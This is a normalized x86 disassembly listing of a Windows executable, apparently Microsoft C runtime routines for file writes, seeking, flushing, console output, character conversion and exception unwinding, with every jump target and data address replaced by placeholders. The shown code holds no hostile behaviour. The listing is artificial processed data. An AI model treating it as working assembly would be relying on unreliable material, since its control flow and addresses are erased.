cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40fd43
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_4115bc
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_411714
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_411714
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_4115bc
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_411095
push 0x10
push r--data
call sub_40c290
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x9
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x9
call sub_40bf44
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_40c2d5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_41181d
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40aa97
mov [ eax ] 0x9
call sub_40aaaa
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_410998
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411161
mov eax [ ebp - 0x1c ]
sub_411169
push 0x10
push r--data
call sub_40c290
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40aa97
mov [ eax ] 0x9
call sub_40aa97
mov [ eax ] 0x9
call sub_40bf44
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_40c2d5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_41181d
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_40aa97
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_4117b4
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41123a
mov eax [ ebp - 0x1c ]
call sub_40aaaa
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_411242
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_4117b4
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_40aa97
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_40aabd
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_4112c7
push 0x14
push r--data
call sub_40c290
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x9
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x9
call sub_40bf44
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_40c2d5
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_41181d
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40aa97
mov [ eax ] 0x9
call sub_40aaaa
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411242
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4113a7
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_4113b1
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_40c9d8
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_411400
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_41142b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_4117b4
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_40aabd
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_4117b4
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_4117b4
push 0x1
mov edi eax
call sub_4117b4
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_41172e
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_4114c7
push 0x10
push r--data
call sub_40c290
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x9
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x9
call sub_40bf44
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_40c2d5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_41181d
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_40aa97
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_41142b
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411583
mov eax [ ebp - 0x1c ]
sub_41158b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_409fcc
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_4115bc
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_411951
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_4115fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40b678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_40fd0b
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_40aa97
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41172e
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_40aa97
mov [ eax ] 0x9
call sub_40aaaa
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_4117b4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x9
call sub_40aaaa
and [ eax ] 0x0
call sub_40aa97
mov [ eax ] 0x9
call sub_40bf44
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_41181d
push 0xc
push r--data
call sub_40c290
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_40bacf
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40c2d5
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4118b3
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_4118bc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4118f0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_41198e
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_4119c7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_411a1b
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412969
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_411a51
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_409fbd
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_412969
add esp 0x20
pop esi
pop ebp
retn
sub_411a84
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_411b5b
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_40b2d2
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_411b5b
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_409fbd
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_412969
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_411a84
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4119c7
pop ebx
leave
retn
sub_411bfa
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_40bb4e
call sub_40bb4e
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_411c6d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_40b2d2
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_40b2d2
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_411c99
mov edi edi
push ebp
mov ebp esp
call sub_40b2d2
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_411cc0
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40b2d2
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_40b2d2
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_40b2d2
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_40bb4e
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_411d12
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_411a51
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_412a50
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_411d7d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40a545
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a0eb
pop ecx
sub_411da4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_40da00
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_411e03
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_40b2d2
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_40b2d2
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_40b2d2
and [ eax + 0x90 ] 0x0
jmp sub_40bb02
sub_411e52
push 0x10
push r--data
call sub_40c290
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411f14
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_40b2d2
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_40c2d5
retn
call sub_40bb4e
call sub_40bb4e
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
